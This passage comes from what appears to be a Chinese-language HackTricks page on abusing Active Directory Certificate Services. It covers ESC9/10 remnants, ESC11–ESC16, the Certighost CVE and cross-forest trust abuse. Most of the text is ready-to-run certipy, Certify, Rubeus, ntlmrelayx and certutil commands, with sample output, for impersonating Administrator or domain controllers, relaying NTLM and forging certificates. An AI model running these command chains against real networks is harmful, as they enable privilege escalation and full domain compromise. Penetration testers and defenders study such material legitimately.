certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` 的 `userPrincipalName` 随后恢复为其原始值 `Jane@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
使用获取的证书进行身份验证将获得 `Administrator@corp.local` 的 NT hash；由于证书中不包含域信息，因此必须在命令中指定域。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 滥用场景 2

当 `CertificateMappingMethods` 包含 `UPN` 位标志（`0x4`）时，拥有 `GenericWrite` 权限的账户 A 可以入侵任何缺少 `userPrincipalName` 属性的账户 B，包括机器账户和内置域管理员 `Administrator`。

这里的目标是入侵 `DC$@corp.local`，首先通过 Shadow Credentials 获取 `Jane` 的哈希，并利用 `GenericWrite`。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` 的 `userPrincipalName` 随后被设置为 `DC$@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
使用默认的 `User` 模板，以 `Jane` 的身份请求客户端身份验证证书。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` 的 `userPrincipalName` 会在此过程后恢复为其原始值。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
通过 Schannel 进行身份验证时，使用 Certipy 的 `-ldap-shell` 选项，表明身份验证成功，用户为 `u:CORP\DC$`。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
通过 LDAP shell，`set_rbcd` 等命令可启用基于资源的约束委派（RBCD）攻击，从而可能攻陷域控制器。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
此漏洞同样适用于任何缺少 `userPrincipalName` 的用户账户，或其 `userPrincipalName` 与 `sAMAccountName` 不匹配的用户账户。默认的 `Administrator@corp.local` 是一个主要目标，因为它具有较高的 LDAP 权限，并且默认情况下没有 `userPrincipalName`。

## Relaying NTLM to ICPR - ESC11

### 说明

如果 CA Server 未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，则可以通过 RPC 服务在不进行签名的情况下执行 NTLM relay attacks。[Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。<sup>[[10]](#references)</sup>

你可以使用 `certipy` 枚举 `Enforce Encryption for Requests` 是否被禁用；如果是，certipy 将显示 `ESC11` Vulnerabilities。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

需要设置一个 relay server：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意：对于域控制器，必须在 DomainController 中指定 `-template`。

或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket)：
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### 说明

Administrators 可以将 Certificate Authority 配置为将其存储在外部设备上，例如 "Yubico YubiHSM2"。

如果 USB device 通过 USB 端口连接到 CA server，或者在 CA server 为虚拟机的情况下通过 USB device server 连接，则需要 authentication key（有时也称为 "password"），以便 Key Storage Provider 在 YubiHSM 中生成和使用 keys。

此 key/password 以明文形式存储在 registry 的 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 中。

参考[这里](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)。<sup>[[11]](#references)</sup>

### Abuse Scenario

如果 CA 的 private key 存储在 physical USB device 上，并且你获得了 shell access，则可以恢复该 key。

首先，需要获取 CA certificate（这是公开的），然后：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最后，使用 certutil `-sign` 命令，利用 CA 证书及其私钥伪造一个新的任意证书。

## OID Group Link Abuse - ESC13

### 说明

`msPKI-Certificate-Policy` 属性允许将颁发策略添加到证书模板中。负责颁发策略的 `msPKI-Enterprise-Oid` 对象可以在 PKI OID 容器的 Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）中发现。策略可以通过该对象的 `msDS-OIDToGroupLink` 属性链接到 AD 组，从而使系统将出示该证书的用户授权为该组成员。[此处的参考资料](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。<sup>[[12]](#references)</sup>

换句话说，当用户拥有 enroll 证书的权限，且该证书链接到一个 OID 组时，用户可以继承该组的权限。

使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 查找 OIDToGroupLink：
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 滥用场景

查找用户拥有的权限，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。

如果 `John` 拥有注册 `VulnerableTemplate` 的权限，该用户就可以继承 `VulnerableGroup` 组的权限。

它只需要指定该模板，即可获取具有 OIDToGroupLink 权限的证书。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 易受攻击的 Certificate Renewal Configuration- ESC14

### 说明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 中的描述非常详尽。以下是原文引用。<sup>[[14]](#references)</sup>

ESC14 解决的是由“weak explicit certificate mapping”引起的漏洞，主要涉及对 Active Directory 用户或计算机帐户上的 `altSecurityIdentities` 属性的滥用或不安全配置。此多值属性允许管理员手动将 X.509 证书与 AD 帐户关联，以用于身份验证。配置这些显式映射后，它们可以覆盖默认的证书映射逻辑。默认逻辑通常依赖证书 SAN 中的 UPN 或 DNS 名称，或者依赖 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展中嵌入的 SID。

当 `altSecurityIdentities` 属性中用于标识证书的字符串过于宽泛、容易猜测、依赖非唯一的证书字段，或使用容易被伪造的证书组件时，就会产生“weak”映射。如果攻击者能够获取或构造一个证书，使其属性匹配特权帐户的此类 weak 显式映射，那么他们就可以使用该证书进行身份验证，并冒充该帐户。

潜在的 weak `altSecurityIdentities` 映射字符串示例包括：

- 仅依据通用的 Subject Common Name (CN) 进行映射：例如 `X509:<S>CN=SomeUser`。攻击者可能能够从安全性较低的来源获取具有此 CN 的证书。
- 使用过于通用的 Issuer Distinguished Names (DN) 或 Subject DN，而没有通过特定序列号或 subject key identifier 等信息进一步限定：例如 `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 使用其他可预测模式或非加密标识符，而攻击者可能能够在其合法获取或伪造的证书中满足这些条件（例如已攻陷 CA，或发现了 ESC1 中所述的易受攻击模板）。

`altSecurityIdentities` 属性支持多种映射格式，例如：

- `X509:<I>IssuerDN<S>SubjectDN`（通过完整的 Issuer 和 Subject DN 进行映射）
- `X509:<SKI>SubjectKeyIdentifier`（通过证书的 Subject Key Identifier 扩展值进行映射）
- `X509:<SR>SerialNumberBackedByIssuerDN`（通过序列号进行映射，并由 Issuer DN 隐式限定）- 这不是标准格式，通常应为 `<I>IssuerDN<SR>SerialNumber`。
- `X509:<RFC822>EmailAddress`（通过 SAN 中的 RFC822 名称进行映射，通常为电子邮件地址）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（通过证书原始公钥的 SHA1 哈希进行映射 - 通常较为安全）

这些映射的安全性在很大程度上取决于映射字符串中所选证书标识符的具体性、唯一性和加密强度。即使在 Domain Controllers 上启用了 strong certificate binding modes（其主要影响基于 SAN UPN/DNS 和 SID 扩展的隐式映射），配置不当的 `altSecurityIdentities` 条目仍可能因映射逻辑本身存在缺陷或过于宽松，而成为一条直接的冒充路径。

### 滥用场景

ESC14 针对 Active Directory (AD) 中的**显式证书映射**，具体来说就是 `altSecurityIdentities` 属性。如果该属性已被设置（无论是出于设计还是配置错误），攻击者就可以通过出示与该映射匹配的证书来冒充帐户。

#### 场景 A：攻击者可以写入 `altSecurityIdentities`

**前提条件**：攻击者对目标帐户的 `altSecurityIdentities` 属性拥有写入权限，或拥有以下目标 AD 对象权限之一，可以授予自身该权限：
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*。

#### 场景 B：目标通过 X509RFC822（Email）使用 weak 映射

- **前提条件**：目标在 altSecurityIdentities 中具有 weak X509RFC822 映射。攻击者可以将受害者的 mail 属性设置为与目标的 X509RFC822 名称匹配，然后以受害者身份 enroll 一个证书，并使用该证书以目标身份进行身份验证。

#### 场景 C：目标使用 X509IssuerSubject 映射

- **前提条件**：目标在 `altSecurityIdentities` 中具有 weak X509IssuerSubject 显式映射。攻击者可以将受害者主体的 `cn` 或 `dNSHostName` 属性设置为与目标 X509IssuerSubject 映射中的 subject 匹配。然后，攻击者可以以受害者身份 enroll 一个证书，并使用该证书以目标身份进行身份验证。

#### 场景 D：目标使用 X509SubjectOnly 映射

- **前提条件**：目标在 `altSecurityIdentities` 中具有 weak X509SubjectOnly 显式映射。攻击者可以将受害者主体的 `cn` 或 `dNSHostName` 属性设置为与目标 X509SubjectOnly 映射中的 subject 匹配。然后，攻击者可以以受害者身份 enroll 一个证书，并使用该证书以目标身份进行身份验证。

### 具体操作

#### 场景 A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
保存并转换证书
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
使用证书进行身份验证
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
清理（可选）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
如需了解各种攻击场景中更具体的攻击方法，请参考以下内容：[adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 说明

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc 中的描述非常详尽。以下是原文引用。<sup>[[15]](#references)</sup>

利用内置的默认版本 1 certificate templates，攻击者可以构造 CSR，使其包含优先级高于模板中已配置 Extended Key Usage 属性的应用程序策略。唯一要求是具备 enrollment 权限，并且可以使用 **_WebServer_** template 生成 client authentication、certificate request agent 和 code signing certificates

### 利用

以下内容引用自[此链接]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)，点击查看更多详细的使用方法。<sup>[[14]](#references)</sup>


Certipy 的 `find` 命令可以帮助识别在 CA 未打补丁时可能容易受到 ESC15 影响的 V1 templates。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### 场景 A：通过 Schannel 直接冒充

**步骤 1：请求证书，注入 "Client Authentication" Application Policy 和目标 UPN。**攻击者 `attacker@corp.local` 使用 "WebServer" V1 模板（允许由申请者提供 subject）以 `administrator@corp.local` 为目标。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 存在漏洞的 V1 模板，启用了“Enrollee supplies subject”。
- `-application-policies 'Client Authentication'`: 将 OID `1.3.6.1.5.5.7.3.2` 注入 CSR 的 Application Policies 扩展中。
- `-upn 'administrator@corp.local'`: 在 SAN 中设置 UPN，以进行 impersonation。

**Step 2: 使用获取的 certificate 通过 Schannel（LDAPS）进行 authenticate。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: 通过 Enrollment Agent Abuse 进行 PKINIT/Kerberos Impersonation

**Step 1：从 V1 模板请求证书（使用“Enrollee supplies subject”），并注入“Certificate Request Agent” Application Policy。** 此证书用于让攻击者（`attacker@corp.local`）成为 enrollment agent。此处未为攻击者自身 identity 指定 UPN，因为目标是获得 agent capability。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: 注入 OID `1.3.6.1.4.1.311.20.2.1`。

**步骤 2：使用 "agent" 证书代表目标特权用户请求证书。** 这是类似 ESC3 的步骤，使用步骤 1 中的证书作为 agent 证书。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**步骤 3：使用“on-behalf-of”证书以特权用户身份进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA 上全局禁用 Security Extension-ESC16

### 说明

**ESC16（因缺少 szOID_NTDS_CA_SECURITY_EXT Extension 导致的 Elevation of Privilege）**指的是：如果 AD CS 的配置未强制要求在所有 certificates 中包含 **szOID_NTDS_CA_SECURITY_EXT** extension，攻击者就可以利用这一点：

1. 请求一个**不包含 SID binding 的 certificate**。

2. 使用此 certificate **以任意 account 的身份进行 authentication**，例如 impersonating 高权限 account（如 Domain Administrator）。

你也可以参考这篇文章，了解更详细的原理：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### 利用

以下内容参考了[此链接](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)，点击查看更详细的使用方法。<sup>[[14]](#references)</sup>

要识别 Active Directory Certificate Services（AD CS）environment 是否容易受到 **ESC16** 攻击，
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**步骤 1：读取受害者帐户的初始 UPN（可选 - 用于恢复）。
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**步骤 2：将受害者帐户的 UPN 更新为目标管理员的 `sAMAccountName`。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**步骤 3：（如有需要）获取“victim”账户的凭据（例如通过 Shadow Credentials）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**步骤 4：从 _any suitable client authentication template_（例如“User”）向存在 ESC16 漏洞的 CA 请求证书，并将其请求为“victim”用户。** 由于该 CA 存在 ESC16 漏洞，无论模板对该扩展的具体设置如何，它都会自动从签发的证书中省略 SID security extension。设置 Kerberos credential cache 环境变量（shell command）：
```bash
export KRB5CCNAME=victim.ccache
```
然后请求证书：
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**步骤 5：还原“victim”账户的 UPN。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**步骤 6：以目标管理员身份进行身份验证。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 说明

**Certighost** 利用 **AD CS enrollment chase / callback path**，在该路径中，CA 信任请求者提供的请求属性，并据此解析应写入签发证书的身份。在公开 PoC 中，构造的请求包含：<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**：CA 将连接的、由攻击者控制的主机/IP
- **`rmd`**：用于冒充的**目标 Domain Controller DNS 名称**

如果 CA 遵循该 chase，它将通过 **SMB/LSA（`445`）** 和 **LDAP（`389`）** 连接攻击者。攻击者使用一个**真实的 machine account**（通常通过默认的 **`ms-DS-MachineAccountQuota`** 创建），使 callback session 以有效的域主体进行身份验证，但 rogue services 返回的却是**目标 DC** 的身份属性：

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

如果 CA **没有将返回的身份与已验证的 callback principal 进行 cryptographic binding**，它就可能为 **Domain Controller** 签发证书，尽管该 session 实际上是以攻击者控制的 machine account 完成身份验证的。这使该漏洞在概念上不同于 **Certifried**：攻击者不是重写 `dNSHostName` 等 AD 属性，而是在 CA callback resolution 期间**替换身份数据**。<sup>[[2]](#references)</sup>

**有用的前置条件：**

- 低权限的**域凭据**
- 能够**创建或复用 computer account**
- CA 能够访问攻击者控制的 **`389`** 和 **`445`** 端口
- 存在漏洞且未打补丁的 CA request path（**2026 年 7 月 14 日**的 Microsoft 更新增加了针对 **`cdc`** 的 **DC validation** 以及 **resolved-SID comparison**）

随后得到的 **`.pfx`** 可用于 **PKINIT**，生成 **`.ccache`**；在公开 PoC 的流程中，还可获取**目标 DC 的 NT hash**，这通常足以实现**完全控制域**。

### 利用

公开 PoC 会自动完成整条链路：<sup>[[1]](#references)</sup>

1. 创建或复用攻击者控制的 **machine account**。
2. 在 `389` 和 `445` 上启动 **rogue LDAP 和 SMB/LSA listeners**。
3. 提交包含攻击者控制的 **`cdc`** 和目标 **`rmd`** 属性的 certificate request。
4. 让 CA 以受控 machine account 的身份向 rogue listeners 进行身份验证，但在 identity lookups 中返回**目标 DC** 的属性。
5. 接收由 CA 签发的 **DC certificate**，然后将其用于 **PKINIT**。
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC 中有用的 runtime flags：

- `--listener <ip>`：显式选择在 `cdc` 中公布的 callback IP
- `--computer-name <NAME$>`：复用现有 machine account，而不是创建新账户

**Operational notes：**

- PoC 需要 **root** 权限，因为它会绑定 **privileged ports** `389` 和 `445`。
- Exploitation 成功后，会在本地写入 **DC `.pfx`** 和 **Kerberos `.ccache`**。
- 由于该 certificate 会映射到 **Domain Controller account**，后续操作可以包括 **certificate-based Kerberos auth**、**DCSync**，以及复用恢复出的 **machine NT hash**。<sup>[[2]](#references)</sup>

## 使用 Certificates Compromising Forests 的原理（被动语态说明）

### 通过被 Compromise 的 CAs Breaking Forest Trusts

**cross-forest enrollment** 的配置相对容易完成。resource forest 中的 **root CA certificate** 会由 administrators **published to the account forests**，而 resource forest 中的 **enterprise CA** certificates 则会被 **added to the `NTAuthCertificates` and AIA containers in each account forest**。换言之，这种安排会使 resource forest 中的 **CA** 对其管理 PKI 的所有其他 forests 获得完全控制权。如果该 CA 被 **compromised by attackers**，resource forest 和 account forests 中所有用户的 certificates 都可能被其 **forged**，从而破坏 forest 的 security boundary。<sup>[[6]](#references)</sup>

### 授予 Foreign Principals 的 Enrollment Privileges

在 multi-forest environments 中，需要特别注意那些 **publish certificate templates** 的 Enterprise CAs，因为这些 templates 允许 **Authenticated Users or foreign principals**（属于 Enterprise CA 所在 forest 之外的 users/groups）拥有 **enrollment and edit rights**。\
当用户通过 trust 完成 authentication 后，AD 会将 **Authenticated Users SID** 添加到该用户的 token 中。因此，如果某个 domain 拥有一个 Enterprise CA，且其 template **allows Authenticated Users enrollment rights**，则来自不同 forest 的用户可能会 **enroll in** 该 template。同样，如果某个 template 将 **enrollment rights** 显式授予 foreign principal，则会由此建立 **cross-forest access-control relationship**，使一个 forest 中的 principal 能够 **enroll in a template from another forest**。

这两种情况都会导致 forests 之间的 **attack surface increase**。攻击者可能利用 certificate template 的 settings，在 foreign domain 中获得 additional privileges。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

{{#include ../../../banners/hacktricks-training.md}}
